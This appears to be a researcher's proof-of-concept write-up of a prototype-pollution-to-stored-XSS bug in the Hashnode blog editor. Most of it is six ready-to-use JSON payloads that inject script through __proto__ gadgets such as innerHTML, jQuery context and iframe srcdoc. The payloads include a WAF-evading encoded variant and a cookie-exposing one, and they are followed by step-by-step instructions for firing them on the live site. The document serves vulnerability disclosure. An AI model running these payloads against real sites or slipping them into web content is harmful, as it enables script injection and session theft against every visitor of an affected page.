# Prototype Pollution to Stored XSS BY Hashnode

**Researcher:** MD Mehedi Hasan (SecurityTalent)

---

## Introduction

Prototype Pollution is a JavaScript vulnerability where an attacker injects properties into `Object.prototype`, affecting all objects in the runtime. When chained with a **gadget** (a property that reaches a dangerous sink like `innerHTML`), it becomes **Stored DOM XSS** — affecting every visitor to the compromised page.

In this guide, I'll show you **how to discover and confirm this vulnerability step-by-step using the browser**.

---

## The Working Payloads

### Payload 1 — Basic XSS (alert box)
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(12)>"}}');
```

### Payload 2 — String.fromCharCode bypass (evades WAFs)
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(104,101,108,108,111,32,119,111,114,108,100))>"}}');
```

### Payload 3 — Cookie exfiltration
```javascript
const payload = JSON.parse('{"__proto__":{"innerHTML":"<img src=x onerror=alert(String.fromCharCode(67,111,111,107,105,101,115,58,32)+document.cookie)>"}}');
```

### Payload 4 — defaultView gadget (jQuery-based)
```javascript
const payload = JSON.parse('{"__proto__":{"defaultView":"<img src=x onerror=alert(1)>"}}');
```

### Payload 5 — jQuery context gadget
```javascript
const payload = JSON.parse('{"__proto__":{"context":"<img src=x onerror=alert(12)>"}}');
```

### Payload 6 — srcdoc gadget (iframe override)
```javascript
const payload = JSON.parse('{"__proto__":{"srcdoc":"<img src=x onerror=alert(12)>"}}');
```

---


## POC
[![Hashnode POC](POC/Hashnode.gif)](https://youtu.be/A0xOd3GD0Kk?si=9I5YlA64TOrb8Cpb)


## Step-by-Step Bug Discovery via Console

### Phase 1: Verify the Pollution Source


Steps to Reproduce
 * **1. Go to Hashnode blog editor / writing field.**
 * **2. Inject one of the payloads above via the content field or a merge   operation.**
 * **3. Preview or publish the blog post.**
 * **4. Observe JavaScript execution — alert box fires with the decoded  message or cookies.**
 * **5. Confirm pollution via browser console: ({}).innerHTML returns the malicious value.**




**Always ensure you have explicit authorization before testing on any live system. This research was conducted with proper authorization as part of a legitimate security assessment.**

---

*Researcher: MD Mehedi Hasan (SecurityTalent)*  
*Tags: `#prototype-pollution` `#xss` `#dom-xss` `#bug-bounty` `#security` `#javascript`*